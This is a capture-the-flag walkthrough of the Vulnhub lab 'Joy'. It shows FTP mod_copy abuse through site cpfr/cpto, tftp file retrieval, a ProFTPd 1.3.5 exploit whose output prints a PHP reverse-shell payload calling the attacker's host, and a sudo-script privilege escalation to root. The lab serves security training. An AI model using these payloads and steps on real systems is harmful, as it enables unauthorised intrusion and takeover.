---
title: "Joy"
date: 2022-04-15T10:18:12+08:00
draft: false
tags: ["Vulnhub"]
---

Does penetration testing spark joy? If it does, this machine is for you.

This machine is full of services, full of fun, but how many ways are there to align the stars? Perhaps, just like the child in all of us, we may find joy in a playground such as this.

This is somewhat OSCP-like for learning value, but is nowhere as easy to complete with an OSCP exam timeframe. But if you found this box because of preparation for the OSCP, you might as well try harder. :-)

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.

> The machine IP address is `192.168.50.112` for me, yours will be different. Do scan your network before proceeding with the attack. Do snapshot the machine before proceeding, in case we need to revert it once we are finish or we mess up the machine.

## Scanning 

Let us start by scanning using Nmap to find any opened ports in the machine.

```
sudo nmap -sS -p- 192.168.50.112 -oN initial.scan    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 22:24 EDT
Nmap scan report for 192.168.50.112
Host is up (0.0019s latency).
Not shown: 65523 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
25/tcp  open  smtp
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
465/tcp open  smtps
587/tcp open  submission
993/tcp open  imaps
995/tcp open  pop3s
```

#### Port 21 (FTP)

Scanning this FTP port again with default script, I can see that i can log in anonymously: 

```
nmap -sCV -p 21 192.168.50.112 -oN FTP.scan                                            
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 03:41 EDT
Nmap scan report for 192.168.50.112
Host is up (0.0027s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.2.10
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxr-x   2 ftp      ftp          4096 Aug  6 07:27 download
|_drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
Service Info: Host: The

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.89 seconds
```

I also see that there's 2 directory that I have access to: 

- download (Empty)
- upload

Navigating to the `upload` folder, we see a bunch of files here but only one file interest me: `Directory`. Lets download that file:

```
ftp 192.168.50.112
Connected to 192.168.50.112.
220 The Good Tech Inc. FTP Server
Name (192.168.50.112:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||32010|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Aug  6 07:27 download
drwxrwxr-x   2 ftp      ftp          4096 Jan 10  2019 upload
226 Transfer complete
ftp> cd upload
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||40420|)
150 Opening ASCII mode data connection for file list
-rwxrwxr-x   1 ftp      ftp         16421 Aug  6 08:51 directory
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_armadillo
-rw-rw-rw-   1 ftp      ftp            25 Jan  6  2019 project_bravado
-rw-rw-rw-   1 ftp      ftp            88 Jan  6  2019 project_desperado
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_emilio
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_flamingo
-rw-rw-rw-   1 ftp      ftp             7 Jan  6  2019 project_indigo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_komodo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_luyano
-rw-rw-rw-   1 ftp      ftp             8 Jan  6  2019 project_malindo
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_okacho
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_polento
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_ronaldinho
-rw-rw-rw-   1 ftp      ftp            55 Jan  6  2019 project_sicko
-rw-rw-rw-   1 ftp      ftp            57 Jan  6  2019 project_toto
-rw-rw-rw-   1 ftp      ftp             5 Jan  6  2019 project_uno
-rw-rw-rw-   1 ftp      ftp             9 Jan  6  2019 project_vivino
-rw-rw-rw-   1 ftp      ftp             0 Jan  6  2019 project_woranto
-rw-rw-rw-   1 ftp      ftp            20 Jan  6  2019 project_yolo
-rw-rw-rw-   1 ftp      ftp           180 Jan  6  2019 project_zoo
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
226 Transfer complete
ftp> get directory
local: directory remote: directory
229 Entering Extended Passive Mode (|||8808|)
150 Opening BINARY mode data connection for directory (16625 bytes)
100% |***************************************************************************************************************| 16625        9.58 MiB/s    00:00 ETA
226 Transfer complete
16625 bytes received in 00:00 (4.02 MiB/s)
ftp> exit
221 Goodbye.
```

And read the file. I snip a lot of here just to show what file to look at:

```
cat directory 
Patrick's Directory

total 416
drwxr-xr-x 18 patrick patrick 20480 Aug  6 16:55 .
drwxr-xr-x  4 root    root     4096 Jan  6  2019 ..
...
-rw-r--r--  1 patrick patrick   407 Jan 27  2019 version_control
...

You should know where the directory can be accessed.

Information of this Machine!

Linux JOY 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
```

Yes. There's a `version_control` file. This file can potentially help me to progress my enumeration but we have no way to download and read it.

## Two method to get version_control file

And another yes. I hit a wall. I didn't know where to look next because i tried enumerating all the ports here and i got nothing. Even the returns from searchsploit wouldn't work. So I read a couple of writeups/walkthrough on how to work around for this machine and surprisingly, I learn a couple of things.

#### Method #1 

I learn this method by reading `Raj Chandel's Blog`. His write-up for this machine can be found [here].(https://www.hackingarticles.in/digitalworld-local-joy-vulnhub-walkthrough/)

If we take a closer look at the permissions for `download` and `upload` in `FTP` earlier, it shows that we have read/write permission. So we can actually move the `version_control` file from `patrick` home directory to the `ftp` server. This is where i learnt that I can copy files like this but the issue is that, he didn't explain how he know where the `ftp` directory is located. 

```
telnet 192.168.50.112 21
Trying 192.168.50.112...
Connected to 192.168.50.112.
Escape character is '^]'.
220 The Good Tech Inc. FTP Server
site cpfr /home/patrick/version_control
350 File or directory exists, ready for destination name
site cpto /home/ftp/upload/version_control
250 Copy successful
```

Now if we head back to the `FTP` server. We can see that the `version_control` file is there and we can download it: 

```
ftp 192.168.50.112                                                                                   
Connected to 192.168.50.112.
220 The Good Tech Inc. FTP Server
Name (192.168.50.112:kali): anonymous
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||7609|)
150 Opening ASCII mode data connection for file list
drwxrwxr-x   2 ftp      ftp          4096 Aug  6 07:27 download
drwxrwxr-x   2 ftp      ftp          4096 Aug  6 09:15 upload
226 Transfer complete
ftp> cd upload
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||22832|)
150 Opening ASCII mode data connection for file list
...
-rwxrwxr-x   1 ftp      ftp            24 Jan  6  2019 reminder
-rw-r--r--   1 0        0             407 Aug  6 09:15 version_control
226 Transfer complete
ftp> get version_control
local: version_control remote: version_control
229 Entering Extended Passive Mode (|||22410|)
150 Opening BINARY mode data connection for version_control (407 bytes)
100% |***************************************************************************************************************|   407        9.70 MiB/s    00:00 ETA
226 Transfer complete
407 bytes received in 00:00 (189.35 KiB/s)
ftp>
```

#### Method #2

I learn this method by reading `Novasky Medium Blog`. His write-up for this machine can be found [here].(https://novasky.medium.com/digitalworld-local-joy-walkthrough-vulnhub-no-handshakes-for-old-protocol-oscp-practice-1d9cc675ee6e)

This writeup will show you how to mount FTP in your system and obtained the `version_control` file through `tftp` command. `UDP Port 161 - snmp` leaked out information, showing us that `tftp` service is listening on port 36969. To see this ports, we have to scan for `UDP` ports. 

> Do take note that UDP scan will take awhile

```
nmap -sC -sV -sU 192.168.50.112 -oN udp.scan
# Nmap 7.92 scan initiated Fri Apr 15 04:01:47 2022 as: nmap -sC -sV -sU -oN udp.scan 192.168.50.112
Nmap scan report for 192.168.50.112
Host is up (0.0025s latency).
Not shown: 994 closed udp ports (port-unreach)
PORT     STATE         SERVICE  VERSION
68/udp   open|filtered dhcpc
123/udp  open          ntp      NTP v4 (unsynchronized)
| ntp-info: 
|_  
161/udp  open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)
| snmp-win32-software: 
...
1022: 
|     Name: in.tftpd
|     Path: /usr/sbin/in.tftpd
|     Params: --listen --user tftp --address 0.0.0.0:36969 --secure /home/patrick
...
631/udp  open|filtered ipp
1900/udp open|filtered upnp
5353/udp open|filtered zeroconf
Service Info: Host: JOY

Host script results:
|_clock-skew: -251d22h51m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Apr 15 04:22:51 2022 -- 1 IP address (1 host up) scanned in 1264.69 seconds

```

From the result under `Port 161 UDP`, it tells us that `tftp` is listening on port `36969` and its straight to `/home/patrick` directory. From here, we can simply connect to `tftp` and grab `version_control` file because that is where we at when we are connected.  

```
tftp 192.168.50.112 36969                                                                                                                        
tftp> ls
?Invalid command
tftp> ?
Commands may be abbreviated.  Commands are:

connect 	connect to remote tftp
mode    	set file transfer mode
put     	send file
get     	receive file
quit    	exit tftp
verbose 	toggle verbose mode
trace   	toggle packet tracing
status  	show current status
binary  	set mode to octet
ascii   	set mode to netascii
rexmt   	set per-packet retransmission timeout
timeout 	set total retransmission timeout
?       	print help information
tftp> get version_control
Received 419 bytes in 0.0 seconds
```

## Initial Foothold

I can finally progress ....

Reading `version_control` file tells us that `ProFTPd` is actually version 1.3.5 and not 1.2.10: 

```
cat version_control 
Version Control of External-Facing Services:

Apache: 2.4.25
Dropbear SSH: 0.34
ProFTPd: 1.3.5
Samba: 4.5.12

We should switch to OpenSSH and upgrade ProFTPd.

Note that we have some other configurations in this machine.
1. The webroot is no longer /var/www/html. We have changed it to /var/www/tryingharderisjoy.
2. I am trying to perform some simple bash scripting tutorials. Let me see how it turns out.
```

Looking for `ProFTPd 1.3.5` vulnerability in searchsploit return this: 

```
searchsploit ProFTPd 1.3.5                                                                                                                          1 ⚙
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                            |  Path
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit)                                                                 | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution                                                                       | linux/remote/36803.py
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution (2)                                                                   | linux/remote/49908.py
ProFTPd 1.3.5 - File Copy                                                                                                 | linux/remote/36742.txt
-------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

I tried to use the exploit from searchsploit but it didn't work for me. I didn't try the Metasploit exploit. So i clone one from github that is from [thegingerninja](https://github.com/thegingerninja/ProFTPd_1_3_5_mod_copy_exploit).

```
git clone https://github.com/thegingerninja/ProFTPd_1_3_5_mod_copy_exploit.git                                                                      1 ⚙
Cloning into 'ProFTPd_1_3_5_mod_copy_exploit'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 11 (delta 1), reused 4 (delta 0), pack-reused 0
Receiving objects: 100% (11/11), done.
Resolving deltas: 100% (1/1), done.

cd ProFTPd_1_3_5_mod_copy_exploit
```

Run the exploit to understand how to use it: 

```
python2 exploit_proftd_1_3_5.py                                                          
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.

Usage: python exploit_proftd_1_3_5.py <RHOST> <SITEPATH> <LHOST> <LPORT>
```

For the `sitepath`, we specify `/var/www/tryingharderisjoy`. This can be found in the `version_control` file. Before we run the exploit, be sure to set up a `nc` listener first. 

```
nc -lvnp 1234
listening on [any] 1234 ...

# Run the exploit on another terminal 

python2 exploit_proftd_1_3_5.py 192.168.50.112 /home/ftp/upload 10.10.10.2 1234
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[+] REMINDER: Start a Netcat listener on port: 1234
[+] Running exploit for ProFTPd 1.3.5...
[+] FTP Banner: 220 The Good Tech Inc. FTP Server

[+] Sending exploit...
[+] Running payload by requesting: http://192.168.50.112/pealthe.php?banana=nohup%20php%20-r%20%27%24sock%3Dfsockopen%28%2210.10.10.2%22%2C1234%29%3Bexec%28%22/bin/sh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27%20%26%20
[+] Thank you for using this exploit. Now go bananas!
```

The exploit works and we have a shell as `www-data`. Lets stable the shell before moving forward. 

```
nc -lvnp 1234                           
listening on [any] 1234 ...
connect to [10.10.10.2] from (UNKNOWN) [192.168.50.112] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data),123(ossec)
$ export TERM=xterm
$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@JOY:/var/www/tryingharderisjoy$ ^Z
zsh: suspended  nc -lvnp 1234
                                                                                                                                                            
┌──(kali㉿kali)-[~/Vulnhub/Joy]
└─$ stty raw -echo; fg                                                                                                                        
[1]  + continued  nc -lvnp 1234

www-data@JOY:/var/www/tryingharderisjoy$
```

## Privileged Escalation 

#### www-data to Patrick 

Upon recieving a shell, we are in the `/var/www/tryingharderisjoy` directory. There's a file called `patricksecretsofjoy` in `/tryingharderisjoy/ossec` directory. Viewing it will give us `patrick` password: 

```
www-data@JOY:/var/www/tryingharderisjoy# ls
ossec  pealthe.php
www-data@JOY:/var/www/tryingharderisjoy# cd ossec/
www-data@JOY:/var/www/tryingharderisjoy/ossec# ls
CONTRIB		  img	     lib	     patricksecretsofjoy  setup.sh
css		  index.php  LICENSE	     README		  site
htaccess_def.txt  js	     ossec_conf.php  README.search	  tmp
www-data@JOY:/var/www/tryingharderisjoy/ossec# cat patricksecretsofjoy 
credentials for JOY:
patrick:apollo098765
root:howtheheckdoiknowwhattherootpasswordis

how would these hack3rs ever find such a page?
www-data@JOY:/var/www/tryingharderisjoy/ossec
```

With that, we can simply change to `patrick` using the `su` command: 

```
su patrick
Password: apollo098765
patrick@JOY:/var/www/tryingharderisjoy/ossec$ id
id
uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner),1001(ftp)
patrick@JOY:/var/www/tryingharderisjoy/ossec$
```

#### Patrick to Root


Running `sudo -l` to check what sudo permission does `patrick` has: 

```
atrick@JOY:~/script$ sudo -l
Matching Defaults entries for patrick on JOY:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User patrick may run the following commands on JOY:
    (ALL) NOPASSWD: /home/patrick/script/test
```

Running that script as sudo allow us to change any file from the current permission, to the permission we give it to. We can't access the `/script` folder due to the folder permission. So what I did was I run the script to change the `/script` directory permission to 777, so that i can gain access to this directory and edit the `test` file: 

```
# Changing script permission 

patrick@JOY:~$ sudo script/test
sudo script/test
I am practising how to do simple bash scripting!
What file would you like to change permissions within this directory?
../script
What permissions would you like to set the file to?
777
Currently changing file permissions, please wait.
Tidying up...
Done!
patrick@JOY:~$ ls -l | grep script
drwxrwxrwx 2 root    root    4096 Aug  6 20:03 script
```

We now have access to the `test` file. Viewing it in `nano` will show us how the script works. I will just add bash after the `#!/bin/sh` line: 

```
#!/bin/sh

bash

echo "I am practising how to do simple bash scripting!"
...
```

Save the file and run it as `sudo` again: 

```
patrick@JOY:~/script$ sudo /home/patrick/script/test
root@JOY:/home/patrick/script# id
uid=0(root) gid=0(root) groups=0(root)
root@JOY:/home/patrick/script# cat /root/proof.txt 
Never grant sudo permissions on scripts that perform system functions!
root@JOY:/home/patrick/script#
```


## Summary 

I wasted a lot of time enumerating other ports. I was stuck because i ran out of ideas. Exposure is important they say! Overall I would say that for this machine, enumeration part plays a big role. If it wasnt for the writeup I dont think I will root this machine. Things to takeaway from this machine is definitely 

- Scanning of UDP Ports 
- CPFR / CPTO command in telnet for FTP
- Hands-on on TFTP command. 

I had my fun. See you all in the next post!  




